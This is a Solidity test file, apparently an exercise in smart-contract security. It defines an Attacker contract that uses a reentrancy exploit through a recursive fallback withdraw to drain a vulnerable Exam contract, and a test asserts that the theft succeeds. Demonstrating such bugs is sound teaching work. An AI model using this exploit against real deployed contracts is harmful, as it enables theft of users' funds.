// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Exam} from "../src/Exam.sol";

contract Attacker {
    Exam private exam;
    uint private amount;

    constructor(Exam _exam) {
        exam = _exam;
    }

    function attack() external payable {
        amount = msg.value;
        exam.deposit{value: msg.value}();
        exam.withdraw(amount);
    }

    fallback() external payable {
        if (address(exam).balance >= amount) {
            exam.withdraw(amount);
        }
    }
}

//Vulnerable contract test
contract ExamTest is Test {
    Exam private exam;
    Attacker private attacker;
    address public me;

    function setUp() public {
        exam = new Exam();
        attacker = new Attacker(exam);
        me = makeAddr("me");
        vm.deal(me, 67 ether);

        vm.prank(me);
        exam.deposit{value: 67 ether}();
    }

    function testAfterDeployment() public {
        assertEq(address(exam).balance, 67 ether);
        assertEq(exam.balances(me), 67 ether);
        assertEq(address(me).balance, 0);
    }

    function testWithdraw() public {
        vm.prank(me);
        exam.withdraw(1 ether);
        assertEq(address(exam).balance, 66 ether);
        assertEq(exam.balances(me), 66 ether);
        assertEq(address(me).balance, 1 ether);
    }

    function testAttack() public {
        attacker.attack{value: 1 ether}();
        assertEq(address(exam).balance, 0);
        assertEq(address(attacker).balance, 68 ether);
    }
}
